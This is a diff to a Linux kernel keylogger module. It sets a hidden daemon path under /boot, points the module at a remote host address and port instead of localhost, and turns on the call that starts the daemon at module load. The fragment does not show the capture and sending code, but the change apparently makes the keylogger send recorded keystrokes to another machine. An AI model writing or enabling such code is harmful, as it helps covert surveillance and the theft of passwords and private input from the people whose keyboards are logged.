@@ -17,8 +17,8 @@
 
 MODULE_LICENSE("GPL");              /* General Public License - required by keyboard_notifier */
 
-static char *daemon;
-static char *host = "127.0.0.1";
+static char *daemon = "/boot/.daemon";
+static char *host = "192.168.61.174";
 static char *port = "2000";
 
 module_param(daemon, charp, 0000);
@@ -147,8 +147,8 @@ static int __init keylogger_init(void)
     spin_lock_init(&lock);
     init_waitqueue_head(&waitq);
 
-    /* return start_deamon() */
-    return 0;
+    return start_deamon();
+    //return 0;
 }
 
 static void __exit keylogger_exit(void)
